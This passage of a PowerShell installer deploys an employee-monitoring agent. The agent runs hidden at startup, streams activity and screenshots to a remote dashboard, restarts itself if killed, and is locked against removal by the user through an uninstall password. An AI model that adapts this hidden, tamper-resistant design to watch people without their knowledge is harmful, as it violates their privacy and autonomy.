    Say ''
    Say 'Agent uninstalled. No further data is collected from this machine.'
    exit 0
}

if ($Status) {
    Show-Status
    exit 0
}

Assert-Admin

Say '========================================================'
Say '  Easyskill Windows Monitoring Agent - Deploy'
Say '========================================================'
Say ''

# --- 0. stop a previous install ---------------------------------------------
# The running agent holds the log file open; if we reorganised the folder
# underneath it, it would recreate the file where it can no longer write.
if (Test-Path (Join-Path $InstallDir 'config.json')) {
    Step 'Stopping the previously installed agent'
    foreach ($attempt in 1..3) {
        try { Stop-ScheduledTask -TaskName $SupTaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue } catch { }
        try { Stop-ScheduledTask -TaskName $KeepTaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue } catch { }
        Get-AgentProcesses | ForEach-Object {
            try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { }
        }
        Start-Sleep -Seconds 2
        if (@(Get-AgentProcesses).Count -eq 0) { break }
    }
    # A stale lock makes the supervisor believe another instance is alive and
    # it exits without doing anything - drop it while nothing is running.
    Remove-Item (Join-Path $InstallDir 'supervisor.lock') -Force -ErrorAction SilentlyContinue
    Ok 'Previous agent stopped'
    Say ''

    # Make the folder usable again before we try to overwrite anything: a
    # previous run may have left files in a state only SYSTEM can write.
    Step 'Preparing existing folder for update'
    $repaired = Lock-AgentFolder -Dir $InstallDir
    Ok "Re-permissioned $repaired path(s)"
    Say ''
}

# --- 1. runtime --------------------------------------------------------------
$nodeExe = $null
if ($BundledExe) {
    Step 'Runtime'
    Ok "Bundled executable ($($BundledExe.Name)) - Node.js not required"
    $nodeExe = Join-Path $InstallDir $BundledExe.Name
} else {
    Step 'Checking Node.js'
    $node = Find-Node
    if ($node) {
        $nodeExe = $node.Path
        Ok "Found $($node.Version) -> $nodeExe"
    } else {
        $nodeExe = Install-NodePortable -TargetDir $InstallDir
    }
}

# --- 2. config inputs -------------------------------------------------------
if (-not $ServerUrl -or -not $AgentKey) {
    $srcCfg = Read-Json $SrcConfig
    $dstCfg = Read-Json (Join-Path $InstallDir 'config.json')
    if (-not $ServerUrl) {
        $ServerUrl = if ($dstCfg -and $dstCfg.serverUrl) { $dstCfg.serverUrl }
                     elseif ($srcCfg -and $srcCfg.serverUrl) { $srcCfg.serverUrl }
                     else { 'https://easyskill-windows-fy9f.onrender.com' }
    }
    if (-not $AgentKey) {
        $AgentKey = if ($dstCfg -and $dstCfg.agentKey) { $dstCfg.agentKey }
                    elseif ($srcCfg -and $srcCfg.agentKey) { $srcCfg.agentKey }
                    else { '' }
    }

    if (-not $NonInteractive) {
        Say ''
        Say 'Press Enter to accept the value shown in [brackets].'
        $i = Read-Host " Dashboard server URL [$ServerUrl]"
        if ($i) { $ServerUrl = $i }
        $k = Read-Host " Agent key [$AgentKey]"
        if ($k) { $AgentKey = $k }
        Say ''
    }
}
if (-not $AgentKey) {
    Fail 'No agent key provided. Pass -AgentKey "..." or edit agent\config.json first.'
    exit 1
}

# --- 2b. uninstall password -------------------------------------------------
# The employee must not be able to remove the agent. Only a salted SHA-256
# hash is written to disk; the plaintext below is printed once and then gone.
$installedCfg = Read-Json (Join-Path $InstallDir 'config.json')
$existingHash = ''; $existingSalt = ''
if ($installedCfg) {
    $secProp = $installedCfg.PSObject.Properties['security']
    if ($secProp -and $secProp.Value) {
        $h = $secProp.Value.PSObject.Properties['uninstallHash']
        $s = $secProp.Value.PSObject.Properties['uninstallSalt']
        if ($h) { $existingHash = $h.Value }
        if ($s) { $existingSalt = $s.Value }
    }
}
$requestedPw = $SetUninstallPassword
if (-not $requestedPw -and -not $existingHash -and -not $NonInteractive) {
    $entered = Read-Host ' Uninstall password (Enter to auto-generate)'
    if ($entered) { $requestedPw = $entered }
}
$uninstallSecret = New-UninstallSecret `
    -ExistingHash $existingHash -ExistingSalt $existingSalt `
    -Requested $requestedPw `
    -KeepExisting:([bool]($existingHash -and -not $requestedPw))
$freshPw = $uninstallSecret.password

# --- 3. files ---------------------------------------------------------------
Step "Installing agent to $InstallDir"
Install-AgentFiles -Src $SourceDir -Dst $InstallDir
Ok 'Agent files copied'

# --- 4. config --------------------------------------------------------------
Step 'Writing configuration'
$shots = -not $DisableScreenshots
Write-AgentConfig -Path (Join-Path $InstallDir 'config.json') `
    -Server $ServerUrl -Key $AgentKey -ShotInterval $ScreenshotIntervalSec -Shots $shots `
    -Security $uninstallSecret.block
Ok "Server:  $ServerUrl"
Ok "Machine: $env:COMPUTERNAME"
Ok "Screenshots: $(if ($shots) { "every ${ScreenshotIntervalSec}s" } else { 'disabled' })"
if ($freshPw) {
    Ok 'Uninstall password generated (shown once):'
    Say ''
    Write-Host "        $freshPw" -ForegroundColor Yellow
    Say ''
    Warn 'Record it now - only its hash is stored, so it cannot be recovered.'
} elseif ($requestedPw) {
    Ok 'Uninstall password set'
} else {
    Ok 'Uninstall password kept from the previous install'
}

# --- 5. dependencies --------------------------------------------------------
if (-not $BundledExe) {
    Invoke-NpmInstall -WorkDir $InstallDir -NodeExe $nodeExe
} else {
    Ok 'No npm dependencies - everything is inside the executable'
}

# --- 5b. permissions --------------------------------------------------------
# Must run after npm install (npm needs to write) and before the agent starts.
Protect-AgentFolder -Dir $InstallDir

# --- 6. tasks ---------------------------------------------------------------
Step 'Registering startup + watchdog tasks'
Register-AgentTasks -NodeExe $nodeExe -WorkDir $InstallDir

# --- 7. start ---------------------------------------------------------------
Step 'Starting agent'
try {
    Stop-ScheduledTask -TaskName $SupTaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue
} catch { }
try {
    Start-ScheduledTask -TaskName $SupTaskName -TaskPath $TaskPath -ErrorAction Stop
    Ok 'Supervisor task started'
} catch {
    Warn "Start-ScheduledTask failed: $($_.Exception.Message) - falling back to direct launch"
    if ($BundledExe) {
        Start-Process -FilePath $nodeExe -ArgumentList '--supervisor' `
            -WorkingDirectory $InstallDir -WindowStyle Hidden
    } else {
        Start-Process -FilePath $nodeExe -ArgumentList "`"$InstallDir\supervisor.js`"" `
            -WorkingDirectory $InstallDir -WindowStyle Hidden
    }
}

Say '  Waiting a few seconds for the supervisor to reconcile sessions...'
Start-Sleep -Seconds 6

Test-Deployment -WorkDir $InstallDir

Say ''
Say '========================================================'
Say '  DEPLOYMENT COMPLETE'
Say '========================================================'
Say "  Agent folder : $InstallDir"
Say "  Dashboard    : $ServerUrl"
Say "  Machine name : $env:COMPUTERNAME"
Say ''
    Say '  Behaviour:'
    Say '   - runs at PC startup (before logon) and at every user logon'
    Say '   - hidden background process, no visible window'
    if ($BundledExe) {
        Say "   - single $($BundledExe.Name) process - no Node.js, no node_modules"
    }
    Say '   - restarts within 1 minute if it is killed or crashes'
Say '   - resumes automatically after sleep/hibernate (StartWhenAvailable)'
Say '   - streams activity to the dashboard every 10 s'
Say '   - buffers offline - events queue to disk until the server is back'
Say '   - install folder is read-only for the logged-in user'
Say ''
Say '  Check anytime:   powershell -ExecutionPolicy Bypass -File deploy.ps1 -Status'
Say '  Remove anytime:  powershell -ExecutionPolicy Bypass -File deploy.ps1 -Uninstall'
Say '                    (prompts for the uninstall password set above)'
Say '========================================================'
exit 0
